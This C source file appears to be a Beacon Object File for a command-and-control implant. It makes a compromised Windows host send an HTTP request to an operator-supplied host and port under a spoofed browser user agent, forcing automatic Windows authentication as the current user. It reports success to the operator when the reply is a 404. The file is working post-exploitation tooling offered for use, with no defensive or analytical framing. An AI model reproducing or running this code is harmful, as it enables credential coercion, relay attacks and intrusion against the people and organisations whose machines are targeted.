#include <windows.h>
#include <wininet.h>
#include "beacon.h"
#include "authenticatehttp.h"

int go(char *args, int len) {
    datap parser;
    LPCWSTR host = L"localhost"; //must be hostname or localhost not IP
    INTERNET_PORT port = NULL;
    LPCWSTR path = L"/tab/c";

    BeaconDataParse(&parser, args, len);
    host = (CHAR*)BeaconDataExtract(&parser, NULL);
    port = BeaconDataInt(&parser);


    HINTERNET hInet = WININET$InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) {
        BeaconPrintf(CALLBACK_ERROR, "InternetOpen failed: %lu", KERNEL32$GetLastError());
        return 1;
    }

    HINTERNET hConn = WININET$InternetConnectW(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        BeaconPrintf(CALLBACK_ERROR, "InternetConnect failed: %lu", KERNEL32$GetLastError());
        WININET$InternetCloseHandle(hInet);
        return 1;
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    HINTERNET hReq = WININET$HttpOpenRequestW(hConn, L"GET", path, NULL, NULL, NULL, flags, 0);
    if (!hReq) {
        BeaconPrintf(CALLBACK_ERROR, "HttpOpenRequest failed: %lu", KERNEL32$GetLastError());
        WININET$InternetCloseHandle(hConn);
        WININET$InternetCloseHandle(hInet);
        return 1;
    }

    if (!WININET$HttpSendRequestW(hReq, NULL, 0, NULL, 0)) {BeaconPrintf(CALLBACK_ERROR, "HttpSendRequest failed: %lu", KERNEL32$GetLastError());
    } else {
        DWORD status = 0, slen = sizeof(status);
        if (WININET$HttpQueryInfoW(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status, &slen, NULL)) {
            if (status == 404) {BeaconPrintf(CALLBACK_OUTPUT, "[+] Forced Windows authentication as the current user likely succeeded!");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "Unexpected HTTP status: %lu", status);
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "HttpQueryInfo failed: %lu", KERNEL32$GetLastError());
        }
    }

    WININET$InternetCloseHandle(hReq);
    WININET$InternetCloseHandle(hConn);
    WININET$InternetCloseHandle(hInet);
    return 0;
}
